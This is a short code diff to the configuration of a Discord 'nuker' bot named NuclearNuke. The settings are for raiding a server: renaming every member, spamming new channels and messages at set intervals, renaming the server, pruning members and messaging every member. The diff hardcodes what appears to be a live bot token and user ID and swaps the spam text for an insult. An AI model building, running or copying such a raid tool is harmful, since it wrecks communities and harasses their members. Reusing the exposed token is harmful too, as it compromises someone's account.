@@ -7,15 +7,15 @@ const Delay = require("delay")
 const Bot = new Discord.Client()
 
 var Self = {}
-Self.token = ""
-Self.user_id = ""
+Self.token = "MTE4NDU4ODMxODU0NjA4MzkwMA.GUCEko.cAQtgkW89ODFbEs4EvWHFzxN0RrpC-xO3Akl_Q"
+Self.user_id = "952935213577695242"
 Self.configuration = {
-    change_members_nickname_to: "Nuked using NuclearNuke",
+    change_members_nickname_to: "Nuked using your mother",
     make_channel_called: "Nuked using NuclearNuke",
-    send_message_to_created_channel: "This server is nuked using NuclearNuke from https://github.com/i2rys/ODiscord",
+    send_message_to_created_channel: "This server is nuked using your mother",
     change_server_name_to: "Nuked using NuclearNuke",
     make_role_called: "Nuked using NuclearNuke",
-    message_every_member: "One of the server your in has been nuked using NuclearNuke from https://github.com/i2rys/ODiscord",
+    message_every_member: "One of the server your in has been nuked using your mother",
     prune_days: 1,
     make_channel_spam_milliseconds: 1000,
     created_channel_message_spam_milliseconds: 2000
